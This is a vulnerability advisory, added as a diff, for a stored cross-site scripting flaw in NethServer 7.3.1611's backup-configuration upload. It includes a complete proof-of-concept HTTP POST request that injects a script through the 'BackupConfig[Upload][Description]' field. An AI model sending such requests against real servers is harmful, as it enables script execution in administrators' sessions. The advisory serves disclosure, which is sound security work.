@@ -1,0 +1,60 @@
+NethServer 7.3.1611 (Upload.json) CSRF Script Insertion Vulnerability
+
+
+Vendor: NethServer.org
+Product web page: https://www.nethserver.org
+Affected version: 7.3.1611-u1-x86_64
+
+Summary: NethServer is an operating system for the Linux enthusiast,
+designed for small offices and medium enterprises. It's simple, secure
+and flexible.
+
+Desc: NethServer suffers from an authenticated stored XSS vulnerability.
+Input passed to the 'BackupConfig[Upload][Description]' POST parameter is
+not properly sanitised before being returned to the user. This can be exploited
+to execute arbitrary HTML and script code in a user's browser session in
+context of an affected site.
+
+Tested on: Kernel 3.10.0.-514.el7.x86_64 on an x86_64
+           CentOS Linux 7.3.1611 (Core)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5432
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5432.php
+
+
+16.08.2017
+
+--
+
+
+PoC request:
+
+POST /en-US/BackupConfig/Upload.json HTTP/1.1
+Host: 172.19.0.195:980
+Connection: close
+Content-Length: 15762
+Accept: */*
+Origin: https://172.19.0.195:980
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8FfEu2Tn6fUOnT80
+Referer: https://172.19.0.195:980/en-US/BackupConfig
+Accept-Language: en-US,en;q=0.8,mk;q=0.6
+Cookie: nethgui=4igflab8fmbi5aq26pvsp5r0f2
+
+------WebKitFormBoundary8FfEu2Tn6fUOnT80
+Content-Disposition: form-data; name="arc"; filename="backup-config.7z.xz"
+Content-Type: application/x-xz
+
+[xz content omitted]
+------WebKitFormBoundary8FfEu2Tn6fUOnT80
+Content-Disposition: form-data; name="BackupConfig[Upload][Description]"
+
+<script>confirm(017)</script>
+------WebKitFormBoundary8FfEu2Tn6fUOnT80--
+
